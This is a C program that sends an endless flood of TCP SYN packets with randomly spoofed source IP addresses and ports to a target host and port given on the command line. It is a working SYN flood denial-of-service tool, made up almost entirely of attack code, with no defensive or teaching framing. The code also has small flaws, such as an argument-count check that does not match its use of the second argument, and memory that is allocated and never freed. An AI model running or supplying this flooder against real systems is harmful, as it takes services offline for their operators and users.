// Raw TCP socket code from https://binarytides.com/raw-sockets-c-code-linux/
// For random int: https://stackoverflow.com/questions/822323/how-to-generate-a-random-int-in-c


#include <time.h>
#include <stdio.h>	//for printf
#include <string.h> //memset
#include <sys/socket.h>	//for socket ofcourse
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/tcp.h>	//Provides declarations for tcp header
#include <netinet/ip.h>	//Provides declarations for ip header
#include <arpa/inet.h> // inet_addr
#include <unistd.h> // sleep()


void send_packet(int sockfd, char *source_ip, int source_port, char *dest_ip, int dest_port);
char *generate_ip(void);

/* 
	96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
*/
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

/*
	Generic checksum calculation function
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}




int main (int argc, char *argv[]) {

	if (argc < 2) {
		printf("Usage: %s <dest ip> <dest port>\n", argv[0]);
		return 1;
	}
	
	// Creates a raw socket
	int sockfd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	
	if(sockfd == -1)
	{
		//socket creation failed, may be because of non-root privileges
		perror("Failed to create socket");
		exit(1);
	}
	
	// IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		perror("Error setting IP_HDRINCL\n");
		exit(0);
	}
	
	// Initialize stuff for random ints
	srand(time(NULL));
	
	while(1) {
	
		char *source_ip = generate_ip();
		int source_port = (rand() % 9000) + 1000;
		send_packet(sockfd, source_ip, source_port, argv[1], atoi(argv[2]));
		
	}
	

	return 0;

}


char *generate_ip(void) {

	char *ip = malloc(16);
	memset(ip, 0, 16);
	char byte[4];
	memset(byte, 0, 4);
	
	sprintf(byte, "%d", rand() % 255);
	strcat(ip, byte);
	memset(byte, 0, 4);
	strcat(ip, ".");
	
	sprintf(byte, "%d", rand() % 255);
	strcat(ip, byte);
	memset(byte, 0, 4);
	strcat(ip, ".");
	
	sprintf(byte, "%d", rand() % 255);
	strcat(ip, byte);
	memset(byte, 0, 4);
	strcat(ip, ".");
	
	sprintf(byte, "%d", rand() % 255);
	strcat(ip, byte);
	memset(byte, 0, 4);
	
	return ip;

}





void send_packet(int sockfd, char *source_ip, int source_port, char *dest_ip, int dest_port)
{
	
	//Datagram to represent the packet
	char datagram[4096], *data, *pseudogram;
	
	//zero out the packet buffer
	memset (datagram, 0, 4096);
	
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in dest;
	struct pseudo_header psh;
	
	//Data part
	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
	strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
	
	//some address resolution
	dest.sin_family = AF_INET;
	dest.sin_port = htons(dest_port);
	dest.sin_addr.s_addr = inet_addr(dest_ip);
	
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
	iph->id = htonl (54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr(source_ip);	//Spoof the source ip address
	iph->daddr = dest.sin_addr.s_addr;
	
	//Ip checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	
	//TCP Header
	tcph->source = htons(source_port);
	tcph->dest = htons(dest_port);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;	//tcp header size
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (5840);	/* maximum allowed window size */
	tcph->check = 0;	//leave checksum 0 now, filled later by pseudo header
	tcph->urg_ptr = 0;
	
	//Now the TCP checksum
	psh.source_address = inet_addr(source_ip);
	psh.dest_address = dest.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
	pseudogram = malloc(psize);
	
	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
	
	tcph->check = csum( (unsigned short*) pseudogram , psize);
	
	//Send the packet
	if (sendto (sockfd, datagram, iph->tot_len, 0, (struct sockaddr *) &dest, sizeof(dest)) < 0)
	{
		perror("sendto failed\n");
	}
	//Data send successfully
	else
	{
		//printf ("Sent packet from %s on port %d\nLength : %d \n\n", source_ip, source_port, iph->tot_len);
	}

}

